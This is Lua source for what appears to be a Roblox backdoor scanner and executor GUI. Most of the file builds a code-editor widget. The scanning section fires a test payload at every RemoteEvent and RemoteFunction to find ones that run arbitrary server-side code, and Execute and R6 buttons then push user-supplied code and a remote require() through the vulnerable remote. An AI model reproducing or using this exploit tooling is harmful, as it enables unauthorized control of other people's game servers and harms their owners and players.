		services.uis.InputChanged:Connect(function(input)
			if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
				local delta = input.Position - dragstart
				mainframe.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
			end
		end)
	end)
	
	--Logging
	local syntaxcolors ={
		output = Color3.fromRGB(255, 255, 255),
		info = Color3.fromRGB(110, 192, 255),
		warn = Color3.fromRGB(255, 136, 57),
		error = Color3.fromRGB(255, 75, 75),
		regular = Color3.fromRGB(200, 200, 200),
	}
	
	local function gettime()
		local time = os.date("*t")
		return string.format("[%02d:%02d:%02d]",time.hour,time.min,time.sec)
	end
	
	local function createlog(msg: string,type)
		local new = examplelog:Clone()
		new.Text = gettime().." "..msg
		new.Parent = console
		new.Visible = true
	
		if type == Enum.MessageType.MessageOutput then
			new.TextColor3 = syntaxcolors.output
		elseif type == Enum.MessageType.MessageInfo then
			new.TextColor3 = syntaxcolors.info
		elseif type == Enum.MessageType.MessageWarning then
			new.TextColor3 = syntaxcolors.warn
		elseif type == Enum.MessageType.MessageError then
			new.TextColor3 = syntaxcolors.error
		else
			new.TextColor3 = syntaxcolors.regular
		end
	end
	
	services.logservice.MessageOut:Connect(function(msg: string,type)
		createlog(msg,type)
	end)
	
	--Settings
	buttons.eventcheckbox.MouseButton1Click:Connect(function()
		scanfor.events = not scanfor.events
		buttons.eventcheckbox.Parent.Icon.Visible = scanfor.events
		print(scanfor.events)
	end)
	buttons.functioncheckbox.MouseButton1Click:Connect(function()
		scanfor.functions = not scanfor.functions
		buttons.functioncheckbox.Parent.Icon.Visible = scanfor.functions
		print(scanfor.functions)
	end)
	
	
	--Tab Switching
	for _, tab: Frame in pairs(tabsframe:GetChildren()) do
		if tab:IsA("Frame") then
			if tab.Name ~= "Executor" then
				tab.Visible = false
			else
				tab.Visible = true
			end
		end
	end
	
	pcall(function()
		for _, button: TextButton in pairs(insides.TabSelector:GetChildren()) do
			if button:IsA("TextButton")	then
				button.MouseButton1Click:Connect(function()
					for _, tab: Frame in pairs(tabsframe:GetChildren()) do
						if tab:IsA("Frame") then
							if tab.Name ~= button.Name then
								tab.Visible = false
							else
								tab.Visible = true
							end
						end
					end
				end)
			end
		end
	end)
	
	--Scanning
	local testpartname: string = "luaclipse_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	
	local instances = {}
	local timer: number = 0
	
	local function checkpayload(instance: RemoteEvent | RemoteFunction)
		fire(instance,payload)
		local start = os.clock()
		while os.clock() - start < info.timeout do
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait(0.001)
		end
		return false
	end
	
	local function scan()
		status.BackgroundColor3 = Color3.fromRGB(255, 127, 41)
		buttons.attach.Visible = false
		scanningtext.Visible = true
		
		coroutine.wrap(function()
			repeat
				timer += 0.001
				task.wait(0.001)
			until info.backdoored
		end)()
		
		table.clear(instances)
		
		for _, instance in ipairs(game:GetDescendants()) do
			if instance.Parent == nil then return end
			if instance:IsA("RemoteEvent") and scanfor.events then
				scanningtext.Text = "Checking: "..instance.Name
				if checkremote(instance) then
					continue
				else
					table.insert(instances,instance)
				end
			end
			if instance:IsA("RemoteFunction") and scanfor.functions then
				scanningtext.Text = "Checking: "..instance.Name
				if checkremote(instance) then
					continue
				else
					table.insert(instances,instance)
				end
			end
		end
	
		for _, instance: RemoteEvent | RemoteFunction in ipairs(instances) do
			scanningtext.Text = "Testing: "..instance.Name
			if checkpayload(instance) then
				info.backdoored = true
				info.vulninstance = instance
				fire(instance,[[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]])
				break
			end
		end
		
		if info.backdoored and info.vulninstance then
			status.BackgroundColor3 = Color3.fromRGB(106, 255, 89)
			scanningtext.Text = "Found backdoor: "..info.vulninstance.Name
			notify("Time took: \n"..tostring(timer).." seconds",5)
		else
			status.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
			scanningtext.Text = "No backdoor found :("
			wait(3)
			buttons.attach.Visible = true
			scanningtext.Visible = false
		end
	end
	
	--Buttons
	for _, button: TextButton in ipairs(mainframe:GetDescendants()) do
		if button:IsA("TextButton") then
			button.AutoButtonColor = false
			button.MouseEnter:Connect(function()
				button.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
			end)
			button.MouseLeave:Connect(function()
				button.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
			end)
		end
	end
	
	buttons.exit.MouseButton1Click:Connect(function()
		pcall(function()
			mainframe:TweenSize(UDim2.new(0,0,0,0),"InOut","Sine",0.5,false)
			wait(0.51)
			sgui:Destroy()
		end)
		return
	end)
	pcall(function()
		buttons.minimze.MouseButton1Click:Connect(function()
			if not minimized then
				mainframe:TweenSize(UDim2.new(0,330,0,85),"InOut","Sine",0.5,false)
			else
				mainframe:TweenSize(UDim2.new(0,600,0,350),"InOut","Sine",0.5,false)
			end
			wait(0.51)
			minimized = not minimized
		end)
	end)
	buttons.attach.MouseButton1Click:Connect(function()
		scan()
	end)
	buttons.execute.MouseButton1Click:Connect(function()
		if not info.backdoored and not info.vulninstance then
			notify("Execution won't work without attaching")
			return
		end
		local code = tabs.executor.FastColoredTextboxV3.Main.Scroll.TextBox.Text
		fire(info.vulninstance,code)
	end)
	buttons.clear.MouseButton1Click:Connect(function()
		tabs.executor.FastColoredTextboxV3.Scroll.TextBox.Text = ""
	end)
	buttons.r6.MouseButton1Click:Connect(function()
		fire(info.vulninstance,[[
	game:GetService("Players"):FindFirstChild("]]..player.Name..[["):LoadCharacter()
	task.wait(0.02)
	require(3436957371):r6(game:GetService("Players"):FindFirstChild("]]..player.Name..[[").Name)
			]])
	end)
	buttons.changebackground.MouseButton1Click:Connect(function()
		if info.currentbackground == 5 then
			info.currentbackground = 1
		else
			info.currentbackground += 1
		end
		if info.currentbackground == 1 then
			buttons.changebackground.Title.Text = "Current:\nNormal"
			background.Image = "rbxassetid://0"
		elseif info.currentbackground == 2 then
			buttons.changebackground.Title.Text = "Current:\nModern"
			background.Image = "rbxassetid://992001116"
		elseif info.currentbackground == 3 then
			buttons.changebackground.Title.Text = "Current:\nGalaxy"
			background.Image = "rbxassetid://9305457875"
		elseif info.currentbackground == 4 then
			buttons.changebackground.Title.Text = "Current:\nRocks"
			background.Image = "rbxassetid://12569743473"
		elseif info.currentbackground == 5 then
			buttons.changebackground.Title.Text = "Current:\nWater"
			background.Image = "rbxassetid://17423929525"
		end
	end)
	
	--Scripts
end;
task.spawn(C_e);
-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Handler
local function C_39()
local script = G2L["39"];
	--# FastColoredTextBox v5 by: C:\Drive
	--# And yes I just pasted everything from seperate scripts into here, I wanted to make it more organized I guess.
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.Template,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--# Automatic Scrolling (1/7)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 35, 0, textsize.Y)
		scrollingframe.CanvasPosition = Vector2.new(scrollingframe.CanvasSize.X.Offset - scrollingframe.AbsoluteWindowSize.X, scrollingframe.CanvasPosition.Y)
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize)
	updatecanvassize()
	
	--# Line Checker (2/7)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--# Lines (3/7)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	local clones = {}
	local currentlinecount = 1
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then
					lastclone:Destroy()
				end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--# Cursor (4/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.4
	local lineheight = textbox.TextSize
	local bgtrans = 0
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255,255,255)
	
	local blinking = true
	local typing = false
	local lasttyped = 0
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
	
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe:TweenPosition(UDim2.new(0, measurer.TextBounds.X + 34, 0, (linenumber - 1) * lineheight),"Out","Sine",0.1,true)
		cursorframe.Visible = true
	end
	local function blink()
		while true do
			if blinking and not typing then
				game:GetService("TweenService"):Create(
					cursorframe,
					TweenInfo.new(blinkinterval,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),
					{BackgroundTransparency = bgtrans}
				):Play()
				task.wait(blinkinterval)
				game:GetService("TweenService"):Create(
					cursorframe,
					TweenInfo.new(blinkinterval,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),
					{BackgroundTransparency = 1}
				):Play()
				task.wait(blinkinterval)
			else
				task.wait(0.1)
			end
		end
	end
	textbox.Focused:Connect(function()
		blinking = true
		cursorframe.Visible = true
	end)
	textbox.FocusLost:Connect(function()
		blinking = false
		cursorframe.Visible = false
	end)
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		typing = true
		lasttyped = tick()
		cursorframe.BackgroundTransparency = bgtrans
		updatecursor()
	end)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	task.spawn(function()
		while true do
			if typing and tick() - lasttyped > 0.5 then
				typing = false
			end
			task.wait(0.1)
		end
	end)
	task.spawn(blink)
	updatecursor()
	blinking = false
	cursorframe.Visible = false
	
	--# Selector (5/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.95
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 34, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight-1),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--# Syntax Highlighting (6/7)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"]                    = "keyword",  ["break"]                 = "keyword",  ["do"]                    = "keyword",
		["else"]                   = "keyword",  ["elseif"]                = "keyword",  ["end"]                   = "keyword",
		["false"]                  = "boolean",  ["for"]                   = "keyword",  ["function"]              = "keyword",
		["if"]                     = "keyword",  ["in"]                    = "keyword",  ["local"]                 = "keyword",
		["nil"]                    = "keyword",  ["not"]                   = "keyword",  ["or"]                    = "keyword",
		["repeat"]                 = "keyword",  ["return"]                = "keyword",  ["then"]                  = "keyword",
		["true"]                   = "boolean",  ["until"]                 = "keyword",  ["while"]                 = "keyword",
		["require"]                = "function", ["goto"]                  = "keyword",  ["self"]                  = "keyword",
		["print"]                  = "function", ["pairs"]                 = "function", ["ipairs"]                = "function",
		["next"]                   = "function", ["tonumber"]              = "function", ["tostring"]              = "function",
		["type"]                   = "function", ["pcall"]                 = "function", ["xpcall"]                = "function",
		["coroutine"]              = "global",   ["table"]                 = "global",   ["string"]                = "global",
		["math"]                   = "global",   ["os"]                    = "global",
		["assert"]                 = "function", ["error"]                 = "function", ["rawget"]                = "function",
		["rawset"]                 = "function",
		["game"]                   = "global",   ["workspace"]             = "global",   ["script"]                = "global",
		["Instance"]               = "type",     ["Vector3"]               = "type",     ["CFrame"]                = "type",
		["Color3"]                 = "type",     ["UDim2"]                 = "type",     ["Enum"]                  = "type",
		["wait"]                   = "function", ["delay"]                 = "function", ["spawn"]                 = "function",
		["tick"]                   = "function", ["time"]                  = "function",
		["Vector2"]                = "type",     ["BrickColor"]            = "type",     ["Region3"]               = "type",
		["Ray"]                    = "type",     ["task"]                  = "global",   ["RunService"]            = "global",
		["UserInputService"]       = "global",   ["getgenv"]               = "function",
		["loadstring"]             = "function", ["GetChildren"]           = "other",    ["GetDescendants"]        = "other",
		["Connect"]                = "other",    ["Play"]                  = "other",    ["Stop"]                  = "other",
		["GetPlayers"]             = "other",
		["Enabled"]                = "property", ["Texture"]               = "property", ["Color"]                 = "property",
		["Size"]                   = "property", ["Lifetime"]              = "property", ["Rate"]                  = "property",
		["Speed"]                  = "property", ["Rotation"]              = "property", ["Transparency"]          = "property",
		["LightEmission"]          = "property", ["LightInfluence"]        = "property", ["SpreadAngle"]           = "property",
		["SoundId"]                = "property", ["Volume"]                = "property", ["PlaybackSpeed"]         = "property",
		["Looped"]                 = "property", ["Playing"]               = "property", ["Pitch"]                 = "property",
		["TimePosition"]           = "property", ["RollOffMode"]           = "property", ["PlaybackRegionsEnabled"] = "property",
		["CameraType"]             = "property", ["FieldOfView"]           = "property", ["Focus"]                 = "property",
		["ViewportSize"]           = "property", ["Active"]                = "property", ["BackgroundColor3"]      = "property",
		["BackgroundTransparency"] = "property", ["BorderColor3"]          = "property", ["BorderSizePixel"]       = "property",
		["ClipsDescendants"]       = "property", ["Draggable"]             = "property", ["Position"]              = "property",
		["Visible"]                = "property", ["ZIndex"]                = "property", ["AnchorPoint"]           = "property",
		["Brightness"]             = "property", ["Range"]                 = "property", ["Shadows"]               = "property",
		["Angle"]                  = "property", ["Health"]                = "property", ["MaxHealth"]             = "property",
		["WalkSpeed"]              = "property", ["JumpPower"]             = "property", ["HipHeight"]             = "property",
		["RigType"]                = "property", ["DisplayName"]           = "property", ["NameDisplayDistance"]   = "property",
		["HealthDisplayDistance"]  = "property", ["HealthDisplayType"]     = "property", ["MoveDirection"]         = "property",
		["AutomaticScalingEnabled"]= "property", ["Anchored"]              = "property", ["CanCollide"]            = "property",
		["CanTouch"]               = "property", ["CanQuery"]              = "property", ["Locked"]                = "property",
		["Massless"]               = "property", ["Reflectance"]           = "property", ["Material"]              = "property",
		["Orientation"]            = "property", ["Velocity"]              = "property", ["RotVelocity"]           = "property",
		["AssemblyLinearVelocity"] = "property", ["AssemblyAngularVelocity"] = "property", ["Shape"]                 = "property",
	}
	
	local colormap = {
		keyword = Color3.fromRGB(255, 173, 250),
		["function"] = Color3.fromRGB(255, 255, 197),
		["global"] = Color3.fromRGB(102, 186, 255),
		["type"] = Color3.fromRGB(156, 220, 254),
		string = Color3.fromRGB(255, 179, 149),
		comment = Color3.fromRGB(152, 216, 120),
		number = Color3.fromRGB(224, 255, 208),
		operator = Color3.fromRGB(255, 215, 0),
		other = Color3.fromRGB(144, 194, 255),
		property = Color3.fromRGB(88, 210, 255),
		boolean = Color3.fromRGB(102, 186, 255)
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	sync()
	
	--# Auto-fill (7/7)
	--# NOTE: This is a new feature so I just made this right now
	
	local suggestionson = false
	local suggestionbox = fctbelements.scroll:WaitForChild("SuggestionBox")
	local example = suggestionbox:WaitForChild("Example")
	local cursorframe = fctbelements.scroll:WaitForChild("Cursor")
	local textbox = fctbelements.scroll:WaitForChild("TextBox")
	
	local suggestions = {
		"and",              "break",            "do",               "else",             "elseif",
		"end",              "false",            "for",              "function",         "if",
		"in",               "local",            "nil",              "not",              "or",
		"repeat",           "return",           "then",             "true",             "until",
		"while",            "require",          "goto",             "self",             "print",
		"pairs",            "ipairs",           "next",             "tonumber",         "tostring",
		"type",             "pcall",            "xpcall",           "coroutine",        "table",
		"string",           "math",             "os",               "assert",           "error",
		"rawget",           "rawset",           "game",             "workspace",        "script",
		"Instance",         "Vector3",          "CFrame",           "Color3",           "UDim2",
		"Enum",             "wait",             "delay",            "spawn",            "tick",
		"time",             "Vector2",          "BrickColor",       "Region3",          "Ray",
		"task",             "RunService",       "UserInputService", "getgenv",          "loadstring",
		"GetChildren",      "GetDescendants",   "Connect",          "Play",             "Stop",
		"GetPlayers",       "Enabled",          "Texture",          "Color",            "Size",
		"Lifetime",         "Rate",             "Speed",            "Rotation",         "Transparency",
		"LightEmission",    "LightInfluence",   "SpreadAngle",      "SoundId",          "Volume",
		"PlaybackSpeed",    "Looped",           "Playing",          "Pitch",            "TimePosition",
		"RollOffMode",      "PlaybackRegionsEnabled", "CameraType",   "FieldOfView",      "Focus",
		"ViewportSize",     "Active",           "BackgroundColor3", "BackgroundTransparency", "BorderColor3",
		"BorderSizePixel",  "ClipsDescendants", "Draggable",        "Position",         "Visible",
		"ZIndex",           "AnchorPoint",      "Brightness",       "Range",            "Shadows",
		"Angle",            "Health",           "MaxHealth",        "WalkSpeed",        "JumpPower",
		"HipHeight",        "RigType",          "DisplayName",      "NameDisplayDistance", "HealthDisplayDistance",
		"HealthDisplayType","MoveDirection",    "AutomaticScalingEnabled", "Anchored",   "CanCollide",
		"CanTouch",         "CanQuery",         "Locked",           "Massless",         "Reflectance",
		"Material",         "Orientation",      "Velocity",         "RotVelocity",      "AssemblyLinearVelocity",
		"AssemblyAngularVelocity", "Shape"
	}
	
	if suggestionson then
		if game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").TouchEnabled then
			local function clear()
				for _, child in ipairs(suggestionbox:GetChildren()) do
					if child.Name == "Example" and child ~= example then
						child:Destroy()
					end
				end
			end
	
			local function check(text, cursorPos)
				local instring = false
				local stringChar = nil
				local incomment = false
				local inlocalvar = false
				local i = 1
				local lastwordstart = 1
	
				while i <= cursorPos and i <= #text do
					local char = text:sub(i, i)
					if incomment then
						if char == "\n" then
							incomment = false
						end
					elseif instring then
						if char == stringChar then
							instring = false
							stringChar = nil
						elseif char == "\\" then
							i = i + 1
						end
					else
						if char == "\"" or char == "'" then
							instring = true
							stringChar = char
						elseif char == "-" and i < #text and text:sub(i + 1, i + 1) == "-" then
							incomment = true
							i = i + 1
						elseif char:match("%s") or char:match("[=,%(%)%{%}%[%];]") or i == #text then
							local word = text:sub(lastwordstart, i - 1):match("^%s*(%w+)%s*$")
							if word == "local" and not inlocalvar then
								inlocalvar = true
							elseif inlocalvar and (char == "=" or char == "in" or char:match("%s")) then
								inlocalvar = false
							end
							lastwordstart = i + 1
						end
					end
					i = i + 1
				end
	
				return instring or incomment or inlocalvar
			end
	
			local function update(curword, cursorPos)
				clear()
	
				if curword == "" or check(textbox.Text, cursorPos) then
					suggestionbox.Visible = false
					return
				end
				local matches = {}
				for _, word in ipairs(suggestions) do
					if word:sub(1, #curword):lower() == curword:lower() then
						table.insert(matches, word)
					end
				end
				if #matches == 0 then
					suggestionbox.Visible = false
					return
				end
				for _, match in ipairs(matches) do
					if match:lower() == curword:lower() then
						suggestionbox.Visible = false
						return
					end
				end
				for _, match in ipairs(matches) do
					local new = example:Clone()
					new.Name = "Example"
					new.Visible = true
					new.Label.Text = match.."  "
					new.Parent = suggestionbox
				end
				if cursorframe.Visible then
					suggestionbox.Position = UDim2.new(0, cursorframe.Position.X.Offset, 0, cursorframe.Position.Y.Offset + cursorframe.Size.Y.Offset + 4)
				end
	
				suggestionbox.Visible = true
			end
	
			textbox:GetPropertyChangedSignal("Text"):Connect(function()
				local word = textbox.Text:match("(%w+)$") or ""
				update(word, textbox.CursorPosition)
			end)
	
			textbox:GetPropertyChangedSignal("CursorPosition"):Connect(function()
				local word = textbox.Text:match("(%w+)$") or ""
				update(word, textbox.CursorPosition)
			end)
		end
	end
end;
task.spawn(C_39);

return G2L["1"], require;
